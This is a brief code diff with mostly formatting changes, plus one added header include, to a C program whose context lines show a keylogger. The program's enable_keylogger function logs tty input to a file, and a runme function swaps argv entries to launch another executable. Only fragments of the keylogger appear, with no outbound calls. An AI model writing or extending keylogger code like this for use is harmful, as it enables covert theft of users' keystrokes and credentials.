@@ -4,6 +4,7 @@
 #include <stdio.h>
 #include <string.h>
 
+#include <sys/wait.h>
 #include <sys/types.h>
 #include <fcntl.h>
 
@@ -75,7 +76,7 @@ void runme(int argc, char **argv)
 		_exit(0);
 	}
 
-	if(argc > 1) {
+	if (argc > 1) {
 		// don't care about overwrite the argc
 		argv[-1] = argv[0];
 		argv[0] = current_exe;
@@ -101,7 +102,7 @@ int enable_keylogger(int argc, char **argv)
 	tas_tty tty = TAS_TTY_INIT;
 	tty.output_fd = open(LOGFILE, O_WRONLY | O_APPEND | O_CREAT | O_CLOEXEC , 0644);
 
-	if(tty.output_fd == -1) {
+	if (tty.output_fd == -1) {
 		#ifdef CMDCHANGE
 			runme(argc, argv);
 		#else
